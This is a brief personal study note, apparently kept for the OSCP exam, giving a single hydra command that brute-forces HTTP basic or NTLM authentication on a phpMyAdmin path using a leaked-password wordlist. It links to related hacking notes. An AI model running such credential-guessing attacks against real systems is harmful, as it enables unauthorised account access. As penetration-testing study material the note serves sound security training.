# hydra brute force HTTP basic authentication

- also works for NTLM
```bash
hydra $IP http-get -L users  -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt /phpmyadmin
```

` zet/20221003150849/README.md `

# Related

- [20221003151188](/zet/20221003151188/README.md) HTTP found CMS
- [20221003151184](/zet/20221003151184/README.md) HTTP found login form
- [20221014185833](/zet/20221014185833/README.md) kb file named kb/hacking/commands/hydra-http-auth.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- ~/kb/hacking/commands/hydra-http-auth.md

Tags:

    #command #hacking #hydra 
